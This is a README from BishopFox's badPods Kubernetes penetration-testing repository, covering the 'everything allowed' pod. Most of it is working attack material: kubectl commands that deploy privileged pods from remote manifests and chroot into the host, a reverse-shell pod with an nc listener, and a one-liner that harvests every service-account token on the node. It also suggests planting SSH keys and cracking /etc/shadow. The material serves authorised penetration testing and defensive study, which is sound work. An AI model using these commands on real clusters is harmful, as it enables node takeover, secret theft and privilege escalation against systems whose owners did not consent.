# Bad Pod #1: Everything allowed

The pod you create mounts the host’s filesystem to the pod. You’ll have the best luck if you can schedule your pod on a control-plane node using the nodeName selector in your manifest. You then exec into your pod and chroot to the directory where you mounted the host’s filesystem. You now have root on the node running your pod. 
* **Read secrets from etcd** – If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
* **Hunt for privileged service account tokens**  - Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 

## Table of Contents
* [Pod Creation & Access](#Pod-Creation-&-Access)
   * [Exec Pods: Create one or more of these resource types and exec into the pod](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
   * [Reverse Shell Pods: Create one or more of these resources and catch reverse shell](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
   * [Deleting Resources](#Deleting-Resources)
* [Post exploitation](#Post-exploitation)
   * [Look for kubeconfig's in the host filesystem](#Look-for-kubeconfig's-in-the-host-filesystem) 
   * [Grab all tokens from all pods on the system](#Grab-all-tokens-from-all-pods-on-the-system)
   * [Some other ideas](#Some-other-ideas)
   * [Attacks that apply to all pods, even without any special permissions](#Attacks-that-apply-to-all-pods-even-without-any-special-permissions)


# Pod Creation & Access

## Exec Pods: Create one or more of these resource types and exec into the pod
**Pod**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
```
**Job**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/job/everything-allowed-exec-job.yaml 
kubectl get pods | grep everything-allowed-exec-job      
kubectl exec -it everything-allowed-exec-job-[ID] -- chroot /host bash
```
**CronJob**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/cronjob/everything-allowed-exec-cronjob.yaml 
kubectl get pods | grep everything-allowed-exec-cronjob      
kubectl exec -it everything-allowed-exec-cronjob-ID -- chroot /host bash
```
**Deployment**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deployment/everything-allowed-exec-deployment.yaml 
kubectl get pods | grep everything-allowed-exec-deployment        
kubectl exec -it everything-allowed-exec-deployment-[ID] -- chroot /host bash
```
**StatefulSet (This manifest also creates a service)**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/statefulset/everything-allowed-exec-statefulset.yaml
kubectl get pods | grep everything-allowed-exec-statefulset
kubectl exec -it everything-allowed-exec-statefulset-[ID] -- chroot /host bash
```
**ReplicaSet**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicaset/everything-allowed-exec-replicaset.yaml
kubectl get pods | grep everything-allowed-exec-replicaset
kubectl exec -it everything-allowed-exec-replicaset-[ID] -- chroot /host bash

```
**ReplicationController**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicationcontroller/everything-allowed-exec-replicationcontroller.yaml
kubectl get pods | grep everything-allowed-exec-replicationcontroller
kubectl exec -it everything-allowed-exec-replicationcontroller-[ID] -- chroot /host bash
```
**DaemonSet**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deamonset/everything-allowed-exec-daemonset.yaml 
kubectl get pods | grep everything-allowed-exec-daemonset
kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
```

## Reverse Shell Pods: Create one or more of these resources and catch reverse shell

Set up listener
```bash
nc -nvlp 3116
```

Create pod from local manifest without modifying it by using env variables and envsubst
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/everything-allowed-revshell-pod.yaml | kubectl apply -f -
```

Catch the shell and chroot to /host 
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
# chroot /host
```

## Deleting Resources
You can delete a resource using it's manifest, or by name: 
```
kubectl delete [type] [resourcename]
kubectl delete -f manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
kubectl delete pod everything-allowed-exec-pod
kubectl delete cronjob everything-allowed-exec-cronjob
```

# Post exploitation

You now have root access to the node. Here are some next steps: 

#### Look for kubeconfig's in the host filesystem 
If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)

```bash
find / -name kubeconfig
```
```
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/var/lib/node-problem-detector/kubeconfig
/var/lib/kubelet/kubeconfig
/var/lib/kube-proxy/kubeconfig
/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
/mnt/stateful_partition/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
```

#### Grab all tokens from all pods on the system
Use something like access-matrix to see if any of them give you more permission than you currently have. Look for tokens that have permissions to get secrets in kube-system

```bash
# This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort

default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/calico-node-token-d426t/token


# For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
DTOKEN=`cat /var/lib/kubelet/pods/ID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions

# Does the token allow you to view secrets in that namespace? How about other namespaces?
# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
```

#### Some other ideas:
* Add your public key authorized_keys on the node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access control-plane nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate Impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test. 

   
# Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
  
